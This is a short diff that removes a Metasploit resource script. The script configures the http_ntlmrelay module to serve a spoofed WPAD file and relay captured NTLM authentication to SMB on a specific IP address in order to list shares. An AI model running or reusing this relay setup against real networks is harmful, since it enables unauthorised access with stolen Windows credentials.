@@ -1,8 +1,0 @@
-use auxiliary/server/http_ntlmrelay
-set URIPATH /wpad.dat
-set SRVHOST 141.210.133.146
-set SRVPORT 80
-set RHOST 141.210.133.146
-set RPORT 445
-set RTYPE SMB_LS
-run
